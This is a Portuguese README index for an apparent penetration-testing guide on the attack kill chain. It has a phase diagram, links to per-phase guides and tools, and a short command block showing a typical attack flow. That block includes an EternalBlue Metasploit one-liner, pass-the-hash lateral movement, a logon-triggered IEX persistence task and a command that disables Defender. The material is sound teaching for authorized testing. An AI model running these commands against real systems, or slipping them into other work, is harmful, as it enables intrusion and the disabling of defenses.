# 🎯 Metodologia de ataque — Kill Chain

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗    ██╗  ██╗██╗██╗     ██╗          ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗
  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    ██║ ██╔╝██║██║     ██║         ██╔════╝██║  ██║██╔══██╗██║████╗  ██║
  ███████║   ██║      ██║   ███████║██║     █████╔╝     █████╔╝ ██║██║     ██║         ██║     ███████║███████║██║██╔██╗ ██║
  ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ██╔═██╗ ██║██║     ██║         ██║     ██╔══██║██╔══██║██║██║╚██╗██║
  ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ██║  ██╗██║███████╗███████╗    ╚██████╗██║  ██║██║  ██║██║██║ ╚████║
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
```

> **Esclarecimento:** [MITRE ATT&CK](https://attack.mitre.org/) é uma base de conhecimento de táticas e técnicas adversárias. A [Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html) é um modelo distinto; os nomes não são sinónimos. A sequência de sete fases deste guia é uma organização didática e não uma equivalência formal entre os modelos. Os termos exploit (código de exploração), payload (carga de ataque) e shell (interface de comandos) são mantidos nos exemplos.

---

## 🎯 O que é a Attack Kill Chain?

A **Attack Kill Chain** descreve as fases pelas quais um atacante passa para comprometer e explorar um sistema ou uma rede alvo. O original também a associa aos nomes **Cyber Kill Chain** e **MITRE ATT&CK**; a distinção entre estes conceitos é esclarecida na nota anterior.

---

## 📊 Fases da Kill Chain

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           CICLO DO ATAQUE                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐        │
│   │ 1. ACESSO    │───▶│ 2. DESCOBERTA│───▶│ 3. ESCALADA DE       │        │
│   │    INICIAL   │    │ ENUMERAÇÃO   │    │    PRIVILÉGIOS       │        │
│   └──────────────┘    └──────────────┘    └──────────────────────┘        │
│          │                                           │                      │
│          │                                           ▼                      │
│          │                               ┌──────────────────────┐          │
│          │                               │ 4. MOVIMENTO         │          │
│          │                               │    LATERAL           │          │
│          │                               └──────────────────────┘          │
│          │                                           │                      │
│          ▼                                           ▼                      │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐        │
│   │ 7. AÇÕES     │◀───│ 6. EVASÃO    │◀───│ 5. PERSISTÊNCIA      │        │
│   │ NOS OBJETIVOS│    │    DE DEFESAS│    │                      │        │
│   └──────────────┘    └──────────────┘    └──────────────────────┘        │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 📖 Guias por fase

| Fase | Descrição | Guia |
|-------|-------------|-------|
| **1. Acesso inicial** | Primeiro ponto de acesso ao alvo | [📄 Ver](./01-Initial-Access.pt.md) |
| **2. Descoberta/enumeração** | Recolher informações sobre o sistema comprometido | [📄 Ver](./02-Enumeration.pt.md) |
| **3. Escalada de privilégios** | Elevar privilégios para administrador/root | [📄 Ver](./03-Privilege-Escalation.pt.md) |
| **4. Movimento lateral** | Deslocar-se pela rede para outros sistemas | [📄 Ver](./04-Lateral-Movement.pt.md) |
| **5. Persistência** | Manter o acesso após reinícios ou deteção | [📄 Ver](./05-Persistence.pt.md) |
| **6. Evasão de defesas** | Contornar o antivírus (AV), o EDR e os controlos de segurança | [📄 Ver](./06-Defense-Evasion.pt.md) |
| **7. Ações sobre os objetivos** | Alcançar o objetivo final (exfiltração, impacto) | [📄 Ver](./07-Actions-Objectives.pt.md) |

---

## 🔗 Guias de referência relacionados

### Por fase

| Fase | Ferramentas relacionadas |
|-------|---------------|
| Acesso inicial | [Metasploit](../../Metasploit/README.md), [SQLMap](../../SQLMap/README.md), [Hydra](../../Hydra/README.md) |
| Enumeração | [Nmap](../../Nmap/README.md), [BloodHound](../../BloodHound/README.md), [PowerView](../../PowerView/README.md) |
| Escalada de privilégios | [Linux-PrivEsc](../../Linux-PrivEsc/README.md), [Windows-PrivEsc](../../Windows-PrivEsc/README.md) |
| Movimento lateral | [Impacket](../../Impacket/README.md), [CrackMapExec](../../CrackMapExec/README.md), [Evil-WinRM](../../Evil-WinRM/README.md) |
| Persistência | [PowerShell](../../PowerShell/README.md), [Metasploit](../../Metasploit/README.md) |
| Evasão de defesas | [Mimikatz](../../Mimikatz/README.md), [PowerShell](../../PowerShell/README.md) |
| Exfiltração de dados | [Linux-Commands](../../Linux-Commands/README.md) |

---

## 📚 Primeiros passos

### Fluxo de ataque típico
```bash
# 1. Acesso inicial — explorar uma vulnerabilidade
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; exploit"

# 2. Enumeração — descobrir a que tens acesso
whoami /all
systeminfo
net user

# 3. Escalada de privilégios — obter SYSTEM/root
.\winPEAS.exe

# 4. Movimento lateral — passar para outros sistemas
impacket-psexec -hashes :HASH administrator@192.168.1.20

# 5. Persistência — manter o acesso
schtasks /create /tn "Updater" /tr "powershell -ep bypass -c IEX(payload)" /sc onlogon

# 6. Evasão de defesas — desativar o antivírus
Set-MpPreference -DisableRealtimeMonitoring $true

# 7. Ações sobre os objetivos — exfiltrar dados
Compress-Archive -Path C:\Sensitive -DestinationPath C:\Temp\data.zip
```

---

## 📚 Recursos

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Cyber Kill Chain - Lockheed Martin](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [Unified Kill Chain](https://www.unifiedkillchain.com/)

---

<p align="center">
  <b>🎯 Segue a Kill Chain!</b><br>
  <i>Apenas para testes de intrusão autorizados!</i>
</p>
